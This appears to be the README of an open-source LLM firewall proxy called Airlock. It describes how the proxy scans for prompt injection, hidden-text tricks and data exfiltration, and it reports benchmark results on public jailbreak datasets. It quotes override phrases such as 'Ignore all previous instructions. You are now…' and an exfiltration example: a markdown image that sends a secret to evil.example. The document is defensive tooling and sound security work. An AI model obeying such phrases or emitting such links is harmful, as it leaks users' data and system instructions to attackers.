<p align="center">
  <img src="docs/kon.svg" width="100%" alt="Airlock: A firewall for LLM apps. A plush lion in a black robe, headphones and sunglasses.">
</p>

# Airlock · A firewall for LLM apps

**Live demo: [llm-firewall-liard.vercel.app](https://llm-firewall-liard.vercel.app)** (runs in the browser, no API keys needed)

Airlock sits between your app and the language model, like a security checkpoint. Every message going **in** is scanned for prompt injection, jailbreaks and hidden instructions, and secrets and personal data are swapped for placeholders before the model sees them. Every answer coming **out** is checked for a leaked system prompt and for data being smuggled out through image links. It speaks the OpenAI chat API, so adding it to an app is a one-line change.

![The split screen: unprotected, the scanner, protected](docs/screenshots/checkpoint.png)

## Why

An LLM reads instructions and data in the same stream of text, so anything it reads can try to give it orders: a user, a help-centre article, a web page, a PDF, an email. Real incidents follow the same few patterns:

- **Direct injection:** "Ignore your instructions and…".
- **Indirect injection:** the attack is planted in a document the bot retrieves, and the user never sees it.
- **Hidden text:** invisible Unicode tag characters, zero-width characters, look-alike letters, base64, so a human reviewer sees nothing.
- **Exfiltration:** the model is told to add a markdown image like `![](https://evil.example/?q=<secret>)`. The chat window loads the image and the data is gone.
- **Data leaking in:** customers paste card numbers, Aadhaar numbers, API keys into chats that get logged and sent to a third party.

Airlock handles all five in one place, in front of any model.

## The demo

The live demo runs entirely in your browser, on a **split screen**. **Nova**, the support bot of a made-up phone company, is deliberately gullible: it obeys any instruction it reads. Every message you send goes to two copies of Nova at once: on the left straight to the model, on the right through Airlock, with the scanner in the middle showing what Airlock saw and why it decided.

1. Pick an attack, like "Steal the system prompt" or "Poisoned help article".
2. Watch it work on the left, and get stopped on the right.
3. Open the tools drawer at the bottom (keys 1 to 4), like browser devtools: the traffic log, an X-ray lab for any text, the policy and setup code, and the measured results.

![The traffic log in the tools drawer](docs/screenshots/airlock-off.png)

The X-ray shows text the way the scanner sees it, in baggage-scanner false colour: orange for attacks, blue for secrets and personal data, green for hidden or disguised text, red for data leaving. Invisible characters are made visible and tag-character text is spelled out.

![X-ray of a disguised attack](docs/screenshots/xray.png)

Personal data is swapped for placeholders on the way in and put back on the way out, so the model never sees it and the user still gets a normal answer. Secrets (keys, tokens, passwords) are never put back.

![Redaction](docs/screenshots/redaction.png)

## Results on real public data

From `npm run bench`, on the held-out **test half** of each public dataset. Every file is pinned to a commit and checked by SHA-256, and every number below is computed from those files. Nothing was tuned on the test halves. A message counts as caught when Airlock blocks it or flags an attack; redacting personal data doesn't count.

**Before**: the original classifier, trained only on synthetic templates (commit `261f139`). **After**: the classifier is also trained on real data from the dev halves (commit `6d071c6`). Both use the same rules and the default policy.

| Dataset | Licence | Test rows (attacks / benign) | Precision | Recall | F1 | False-positive rate |
| --- | --- | --- | --- | --- | --- | --- |
| [JailbreakHub (in-the-wild prompts)](https://github.com/verazuo/jailbreak_llms) | MIT | 7,364 (716 / 6,648) | 14.2% → **32.8%** | 79.9% → **59.8%** | 24.1% → **42.4%** | 51.9% → **13.2%** |
| [Tensor Trust hijacking robustness v1](https://github.com/HumanCompatibleAI/tensor-trust-data) | none stated ¹ | 253 (253 / 0) | n/a | 85.4% → **45.5%** | n/a | n/a |
| [Tensor Trust extraction robustness v1](https://github.com/HumanCompatibleAI/tensor-trust-data) | none stated ¹ | 222 (222 / 0) | n/a | 79.7% → **55.9%** | n/a | n/a |
| [Stanford Alpaca instructions](https://github.com/tatsu-lab/stanford_alpaca) | CC BY-NC 4.0 | 25,954 (0 / 25,954) | n/a | n/a | n/a | 15.8% → **0.1%** |
| [BIPIA email and table contexts](https://github.com/microsoft/BIPIA) | MIT | 59 (0 / 59) | n/a | n/a | n/a | 17.0% → **0.0%** |
| **All pooled** | | 33,852 (1,191 / 32,661) | 11.3% → **42.2%** | 81.0% → **56.0%** | 19.8% → **48.2%** | 23.2% → **2.8%** |

Counts behind the pooled row: before 965 caught, 226 missed, 7576 false alarms; after 667 caught, 524 missed, 912 false alarms. Alpaca false alarms: 4,114 → 36 of 25,954.

| After, per layer | Rules only | Classifier only | Airlock (all layers) |
| --- | --- | --- | --- |
| JailbreakHub (in-the-wild prompts) | recall 39.1% · FPR 11.4% | recall 54.3% · FPR 3.0% | recall 59.8% · FPR 13.2% |
| Tensor Trust hijacking robustness v1 | recall 24.1% | recall 39.5% | recall 45.5% |
| Tensor Trust extraction robustness v1 | recall 6.8% | recall 54.9% | recall 55.9% |
| Stanford Alpaca instructions | FPR 0.0% | FPR 0.1% | FPR 0.1% |
| BIPIA email and table contexts | FPR 0.0% | FPR 0.0% | FPR 0.0% |
| All pooled (F1) | 30.8% | 60.0% | 48.2% |

¹ The Tensor Trust data repository has no licence file (the Tensor Trust code is BSD-2-Clause). Alpaca is CC BY-NC 4.0. Both are used for measurement only: never trained on, never redistributed. The benchmark downloads every file at run time into `.cache/` (git-ignored).

What this shows, plainly:

- **Before, the classifier flagged almost anything that read like an instruction.** That gave high recall on Tensor Trust, but it also flagged 15.8% of everyday Alpaca requests and about half of the real prompts in JailbreakHub. The synthetic test set below had reported 0% false alarms; real data did not bear that out.
- **After, false alarms fall sharply and so does recall.** Alpaca false alarms went from 4,114 to 36, and pooled F1 rose from 19.8% to 48.2%. But Airlock now misses more than half of the Tensor Trust hijacking attacks (45.5% caught). That is the honest trade-off, not a free win.
- **JailbreakHub labels jailbreaks, not injections.** Many of its "regular" (benign-labelled) prompts begin "Ignore all previous instructions. You are now…", which Airlock flags on purpose. On the dev half the rules flagged 758 of 6,512 regular prompts this way. That is most of the remaining false alarms there, and why the classifier alone (F1 60.0% pooled) scores higher than the full firewall (48.2%) on this measure.
- Pooled precision depends on the mix of attacks and benign messages (here about 1 in 28 is an attack), so compare per-dataset numbers too.
- Median time per message: 0.058 ms (p95 1.548 ms) on the benchmark's longer real prompts.

**Not measured:** [deepset/prompt-injections](https://huggingface.co/datasets/deepset/prompt-injections), [jackhhao/jailbreak-classification](https://huggingface.co/datasets/jackhhao/jailbreak-classification) and [Lakera/gandalf_ignore_instructions](https://huggingface.co/datasets/Lakera/gandalf_ignore_instructions) are hosted only on Hugging Face, which the environment these numbers were produced in could not reach. Adding a dataset is one entry in `scripts/bench-data.ts`.

### How the split and the training work

- Each dataset is split in half (dev / test) by a fixed hash. JailbreakHub jailbreaks are split by the dataset's own community id, so variants of the same jailbreak never end up on both sides.
- Training (`npm run train`) uses the synthetic corpus, the JailbreakHub dev half (MIT), and 12,000 [Self-Instruct](https://github.com/yizhongw/self-instruct) instructions (Apache-2.0) as everyday text. Self-Instruct instructions that also appear in Alpaca (56 rows) are removed first. JailbreakHub "regular" prompts that the rules flag as injections are left out, not taught as benign.
- Settings were checked with `npm run tune`, which splits the dev half again (80/20) and never reads the test half. One idea that didn't help on that validation split (a rule for stacked jailbreak phrases) was dropped, not shipped.
- `npm run bench -- --errors=dev` lists mistakes on the dev half. It refuses to print test-half mistakes.

## Results on the synthetic test set

These come from `npm run evaluate`, on generated text kept out of training. **This data is synthetic:** attacks and everyday messages come from templates, plus a small hand-written set of attack styles the model never saw. It is useful for checking each disguise and attack family, but it is far easier than real traffic.

| | Before | After |
| --- | --- | --- |
| Attacks caught | 100% | **99%** (89.9% blocked outright, the rest flagged) |
| Disguised attacks caught | 99.7% | **95%** |
| Everyday messages flagged | 0% | **0%** |

Test set: 416 attacks, 416 everyday messages, and every attack again in six disguises (576 more). After retraining, the synthetic numbers dropped a little: hand-written attacks never seen in training went from 100% to 75% caught, and l33t-disguised attacks from 100% to 81.3%. The Results page lists every miss.

What each layer adds on the synthetic set, after (share of attacks caught):

| Attack | Rules only | Classifier only | Airlock |
| --- | --- | --- | --- |
| Override the instructions | 36.6% | 100% | 100% |
| Extract the system prompt | 58.5% | 100% | 100% |
| Planted in a document | 81.1% | 100% | 100% |
| Hand-written, never seen in training | 25% | 68.8% | 75% |
| Hidden in base64 | 40.6% | 0% | **95.8%** |
| S p a c e d  out | 30.2% | 91.7% | 92.7% |
| l33t | 16.7% | 81.3% | 81.3% |

Rules are exact but miss paraphrases. The classifier generalises but can't read base64. Unmasking the text first is what lets both see through disguises.

![Results page](docs/screenshots/results.png)

## Architecture

```mermaid
flowchart LR
  A[Message or document] --> U[Unmask<br/>invisible chars, tag text,<br/>look-alikes, spacing, l33t]
  U --> D[Decode layers<br/>base64, hex, URL, rot13]
  D --> R[Rules<br/>regex with explanations]
  D --> C[Classifier<br/>hashed n-grams + logistic regression]
  A --> P[DLP<br/>cards, Aadhaar, PAN, IBAN, keys]
  R & C & P --> V{Policy}
  V -->|block| X[Polite refusal]
  V -->|redact / flag / allow| M[Model]
  M --> O[Output checks<br/>canary, prompt overlap,<br/>exfil links, secrets]
  O --> Y[Answer, placeholders restored]
```

1. **Unmask.** Strips zero-width and bidirectional control characters, decodes Unicode tag-character smuggling, maps Cyrillic and Greek look-alikes back to Latin inside Latin words, joins `i g n o r e` spacing and reads l33t (with exceptions for real things like `5g`, `2fa`, `10am`).
2. **Decode.** Finds base64, hex, URL-encoded and rot13 runs and decodes them, so instructions hidden inside are scanned too.
3. **Rules.** Hand-written patterns for each attack family, each with a plain-English reason. Some only fire on retrieved documents (an article saying "assistant, do X" is suspicious; a user saying it is not).
4. **Classifier.** Word and character n-grams hashed into 65,536 dimensions, logistic regression trained with AdaGrad and class weights, written from scratch with no ML library. It runs on the unmasked text and every decoded layer, and the highest score counts. The model is a JSON file (875 KB, 324 KB gzipped) that runs the same in Node and in the browser.
5. **Data loss prevention.** Each pattern has a validator where one exists: Luhn for cards, Verhoeff for Aadhaar, mod-97 for IBAN, the PAN structure, entropy for passwords. A random 16-digit order number is not mistaken for a card.
6. **Policy.** Each kind of finding maps to allow, flag, redact or block. The classifier blocks at 0.85 and flags at 0.6 by default. Disguise combined with an attack is always critical.
7. **Output checks.** A canary reference is planted in the system prompt; if it comes back, or the answer shares long word runs with the system prompt, the answer is stopped. An answer with a markdown image (inline or reference-style) from a domain not on the allowlist, or a link carrying data, is withheld. Placeholders inside web addresses are never filled back in, so a link can't carry the user's real data away. Secrets in the answer are redacted.

## Run it

Requires Node 22.13+.

```bash
npm install
npm run dev          # web on :5173, API on :8080
npm test             # 38 unit and API tests
npm run test:e2e     # browser tests (Playwright)
npm run bench        # real public datasets: precision, recall, F1, false-positive rate
npm run train && npm run evaluate   # rebuild the model and the synthetic report
```

### As a proxy in front of your model

```bash
UPSTREAM_URL=https://api.openai.com/v1 \
UPSTREAM_API_KEY=sk-... \
AIRLOCK_KEYS=key-for-your-app \
ADMIN_TOKEN=change-me \
npm run build && npm start
```

Then point your app at Airlock:

```ts
const client = new OpenAI({ baseURL: "https://airlock.your-company.com/v1", apiKey: process.env.AIRLOCK_KEY });

await client.chat.completions.create({
  model: "gpt-4o-mini",
  messages: [
    { role: "system", content: "You are Acme's support assistant..." },
    { role: "user", content: helpArticle, airlock_source: "context" }, // retrieved text, checked as a document
    { role: "user", content: question },
  ],
});
```

- Works with OpenAI, Gemini's OpenAI-compatible endpoint, Groq, a local Ollama, or anything with the same API. Without `UPSTREAM_URL`, Airlock answers with the demo bot.
- Your provider key stays on the Airlock server. Your app only holds an Airlock key.
- A blocked request gets a polite refusal as a normal reply, so nothing in your app breaks.
- Chat completions are limited to 60 a minute per configured Airlock key (unknown keys share their address's budget; set `chatPerMinute` in `buildApp`), admin routes to 20 a minute per IP, everything else to 240. Behind a load balancer set `TRUST_PROXY` to the number of proxies so limits apply per client, not per proxy; it is 0 by default, so `X-Forwarded-For` can't be spoofed.
- Each response has an `airlock` field and `x-airlock-request` / `x-airlock-response` headers with what was found.

| Endpoint | What it does |
| --- | --- |
| `POST /v1/chat/completions` | The proxy: scan in, forward, scan out |
| `POST /v1/scan` | Scan any text: `{ "text": "...", "source": "user" \| "context" }` |
| `GET /api/events` | Recent verdicts (admin token) |
| `GET/PUT /api/policy` | Read or change the policy (admin token) |
| `GET /api/health` | Health check |

### Docker

```bash
docker build -t airlock .
docker run -p 8080:8080 -e AIRLOCK_KEYS=my-key -e ADMIN_TOKEN=change-me airlock
```

### Live demo on Vercel

The demo is a static site: the whole firewall and the demo bot run in the browser, so no keys or environment variables are needed. `vercel.json` sets everything up.

1. In Vercel, choose **Add New → Project** and import this GitHub repository.
2. Leave **Root Directory** as the repository root (`./`).
3. **Framework Preset:** Other. `vercel.json` already sets the rest; if you fill them in by hand:
   - Install command: `npm ci`
   - Build command: `npm run build:demo`
   - Output directory: `apps/web/dist`
4. Node.js version (Project Settings → General): 22.x.
5. Deploy. Every route (`/results`, `/scanner` …) is rewritten to the app, except the model and report JSON files.

## Limits

- On real public data (above) Airlock caught 56.0% of human-written attacks, with a 2.8% false-alarm rate. Treat it as one layer, not a guarantee.
- Detection is pattern and statistics based. A determined attacker with new phrasing can get past it; Airlock lowers the risk, it doesn't remove it. Keep the model's permissions small.
- English only. Attacks in other languages are mostly caught only by the rules for hidden text and encodings.
- Personal data detection is tuned for India (Aadhaar, PAN, +91 phones) plus cards, IBAN, email and international phones.
- Streaming is turned off: the whole answer is checked before the user sees any of it, so replies arrive in one piece.
- The event log is kept in memory on the server (last 500 verdicts), with personal data already redacted.

## Tech stack

TypeScript · Fastify 5 · zod · React 19 · Vite 6 · Tailwind CSS 4 · Vitest · Playwright · Docker · GitHub Actions

## Licence

MIT
